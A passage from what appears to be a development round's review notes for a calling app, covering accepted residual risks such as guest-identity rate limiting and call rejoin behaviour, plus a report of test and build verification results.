  write a password onto an existing account would be new attack surface on a dead
  surface. Signposting the working sign-in is the proportionate fix.
- **Fresh guest identities reset the M40 dial budget.** Bounded per-IP by
  `guestMintGate`; enumeration of the 10⁶ space stays weeks-long, and another
  layer risks another availability regression — which is this round's whole lesson.
- **A live call is no longer rejoinable by number once the *dialled* party
  leaves.** The History card correctly disappears rather than dead-ending, so this
  is honest degradation, not a hang.

### Verification (round 6)

`pnpm verify` (one script — `check && test && build`, no pipe to swallow an exit
code) green: **1745 passing / 1 skipped**, typecheck and production build clean.
New `server/selfReviewPass2.test.ts` (11, including `pinSlotsSpent` exercised
directly) and `server/selfReviewRelay.test.ts` (12 behavioural tests against the
real signaling handler, including the exact M45 dead-end scenario). Nine stale
pins across seven files were rewritten to the **stronger** invariants, never
relaxed to match the new code.
